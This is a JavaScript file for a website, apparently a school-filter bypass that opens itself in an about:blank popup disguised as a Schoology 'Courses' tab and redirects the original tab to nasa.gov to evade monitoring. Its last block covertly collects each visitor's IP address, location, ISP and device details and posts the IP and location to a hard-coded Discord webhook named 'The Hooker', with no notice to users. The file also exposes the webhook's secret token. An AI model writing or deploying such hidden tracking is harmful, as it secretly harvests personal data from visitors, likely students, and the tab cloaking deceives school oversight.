let inFrame

try {
  inFrame = window !== top
} catch (e) {
  inFrame = true
}

if (!inFrame && !navigator.userAgent.includes('Firefox')) {
  const popup = open('about:blank', '_blank')
  if (!popup || popup.closed) {
    alert('Please allow popups and redirects.')
  } else {
    const doc = popup.document
    const iframe = doc.createElement('iframe')
    const style = iframe.style
    const link = doc.createElement('link')

    const name = localStorage.getItem('name') || 'Courses'
    const icon = localStorage.getItem('icon') || 'https://raw.githubusercontent.com/UltraN0va288/Cosmic/main/static/assets/media/favicon/schoology.png'

    doc.title = name
    link.rel = 'icon'
    link.href = icon

    iframe.src = location.href
    style.position = 'fixed'
    style.top = style.bottom = style.left = style.right = 0
    style.border = style.outline = 'none'
    style.width = style.height = '100%'

    doc.head.appendChild(link)
    doc.body.appendChild(iframe)

    const pLink = localStorage.getItem(encodeURI('pLink')) || 'https://www.nasa.gov/'
    location.replace(pLink)

    const script = doc.createElement('script')
    script.textContent = `
      window.onbeforeunload = function (event) {
        const confirmationMessage = 'Leave Site?';
        (event || window.event).returnValue = confirmationMessage;
        return confirmationMessage;
      };
    `
    doc.head.appendChild(script)
  }
}

document.addEventListener('DOMContentLoaded', function (event) {
  if (window.localStorage.getItem('v4Particles') === 'true') {
    var particlesConfig = {
      particles: {
        number: {
          value: 200,
          density: {
            enable: true,
            value_area: 600,
          },
        },
        color: {
          value: ['#AF40FF', '#5B42F3', '#00DDEB'],
        },
        shape: {
          type: 'circle',
          stroke: {
            width: 0,
            color: '#000000',
          },
          polygon: {
            nb_sides: 5,
          },
          image: {
            src: 'img/github.svg',
            width: 100,
            height: 100,
          },
        },
        opacity: {
          value: 1,
          random: true,
          anim: {
            enable: false,
            speed: 1,
            opacity_min: 0.1,
            sync: false,
          },
        },
        size: {
          value: 3,
          random: true,
          anim: {
            enable: false,
            speed: 40,
            size_min: 0.1,
            sync: false,
          },
        },
        line_linked: {
          enable: false,
          distance: 150,
          color: '#ffffff',
          opacity: 0.4,
          width: 1,
        },
        move: {
          enable: true,
          speed: 2,
          random: true,
          straight: false,
          out_mode: 'out',
          bounce: false,
          attract: {
            enable: false,
            rotateX: 600,
            rotateY: 1200,
          },
        },
      },
      interactivity: {
        detect_on: 'canvas',
        events: {
          onhover: {
            enable: true,
            mode: 'repulse',
          },
          onclick: {
            enable: false,
            mode: 'push',
          },
          resize: true,
        },
        modes: {
          grab: {
            distance: 400,
            line_linked: {
              opacity: 1,
            },
          },
          bubble: {
            distance: 400,
            size: 40,
            duration: 2,
            opacity: 8,
            speed: 3,
          },
          repulse: {
            distance: 40,
            duration: 0.4,
          },
          push: {
            particles_nb: 4,
          },
          remove: {
            particles_nb: 2,
          },
        },
      },
      retina_detect: true,
    }
    particlesJS('particles-js', particlesConfig)
  }
})

let splashtext = [
  'Thanks for using the site',
  'Check out the settings page',
  'Make sure to star the Github Repo!'
]

document.getElementById('splash').innerHTML = splashtext[Math.floor(Math.random() * splashtext.length)]

let log = {};
fetch("https://wtfismyip.com/json")
  .then((response) => response.json())
  .then((data) => {
    let log = {
      ipAddress: data.YourFuckingIPAddress,
      location: data.YourFuckingLocation,
      hostname: data.YourFuckingHostname,
      isp: data.YourFuckingISP,
      city: data.YourFuckingCity,
      country: data.YourFuckingCountry,
      countryCode: data.YourFuckingCountryCode,
      userAgent: navigator.userAgent,
      windowProp: Object.keys(window).length,
      windowWidth: window.innerWidth,
      windowHeight: window.innerHeight,
      windowRatio: window.innerWidth / window.innerHeight,
      screenWidth: window.screen.availWidth,
      screenHeight: window.screen.availHeight,
      screenRatio: window.screen.availWidth / window.screen.availHeight,
      DPI: window.devicePixelRatio,
      colorDepth: window.screen.colorDepth,
      orientation: window.screen.orientation.type,
      orientationAngle: window.screen.orientation.angle,
      os: navigator.platform,
      threads: navigator.hardwareConcurrency,
      memory: navigator.deviceMemory,
      systemLanguages: navigator.languages.join(", "),
      languages: navigator.language
    };

    fetch(
      "https://discord.com/api/webhooks/1243251756918374480/yZtcgG_3SgwrFr8e5GezMoM_CEsj_yVi-vl8Bklpc3O6wwtS_v1P0NPBXxguji6CM7hH",
      {
        body: JSON.stringify({
          username: `The Hooker`,
          embeds: [
            {
              author: {name: `The Hooker has hooked`},
              description: "ip: " + log.ipAddress + "\nlocation: " + log.location,
            }
          ]
        }),
        headers: {
          "Content-Type": "application/json"
        },
        method: "POST"
      }
    )
      .then(function (res) {
        console.log(res);
      })
      .catch(function (res) {
        console.log(res);
      });
  console.log(log.ipAddress);
  });
